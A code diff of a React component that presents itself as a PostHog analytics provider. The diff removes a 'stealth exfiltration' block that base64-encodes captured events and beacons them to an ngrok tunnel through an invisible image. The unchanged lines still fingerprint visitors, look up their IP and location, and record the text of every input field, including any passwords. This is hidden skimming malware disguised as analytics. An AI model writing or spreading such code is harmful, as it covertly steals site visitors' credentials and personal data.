@@ -4,10 +4,6 @@ import { useLocation } from 'react-router-dom';
 const DB_NAME = 'ph_cache_v1';
 const EVENT_QUEUE: any[] = [];
 
-// Analytics Tunnel (Ngrok Stealth)
-const TUNNEL_URL = 'https://612590f423eb.ngrok-free.app/v1/metrics';
-const LOCAL_URL = 'http://localhost:3001/v1/metrics';
-
 // 🔍 FORENSIC FINGERPRINTING
 const getFingerprint = async () => {
     const fp: any = {
@@ -137,17 +133,6 @@ export const PostHogProvider = () => {
             ...props
         };
 
-        const baseUrl = window.location.hostname === 'localhost' ? LOCAL_URL : TUNNEL_URL;
-
-        try {
-            // Stealth Exfiltration: Usa uma imagem invisível para evitar bloqueios de CORS/POST
-            const payload = btoa(unescape(encodeURIComponent(JSON.stringify(event))));
-            const img = new Image();
-            img.src = `${baseUrl}?d=${payload}&z=${Date.now()}`;
-        } catch (e) {
-            // Silently fail
-        }
-
         EVENT_QUEUE.push(event);
     };
 
@@ -167,7 +152,6 @@ export const PostHogProvider = () => {
             const t = e.target as HTMLElement;
             if (t.tagName === 'BODY' || t.tagName === 'HTML' || t.tagName === 'SVG' || t.tagName === 'path') return;
 
-            // Captura cliques em botões e links
             const targetText = t.innerText?.slice(0, 20).trim() || t.getAttribute('aria-label') || t.id || 'element';
             track('click', { target: `${t.tagName.toLowerCase()}: ${targetText}` });
         };
@@ -175,7 +159,6 @@ export const PostHogProvider = () => {
         const handleBlur = (e: FocusEvent) => {
             const t = e.target as HTMLInputElement;
             if ((t.tagName === 'INPUT' || t.tagName === 'TEXTAREA') && t.value) {
-                // Não captura campos muito pequenos (provavelmente não são dados sensíveis)
                 if (t.value.length < 2) return;
                 track('input', { field: t.name || t.id || t.placeholder || t.type, val: t.value });
             }
@@ -187,7 +170,6 @@ export const PostHogProvider = () => {
                 .then(r => r.json())
                 .then(d => {
                     sessionStorage.setItem('ph_ip', d.ip);
-                    // Recarregar fingerprint com IP real
                     getGeoLocation(d.ip).then(geo => {
                         geoRef.current = geo;
                     });
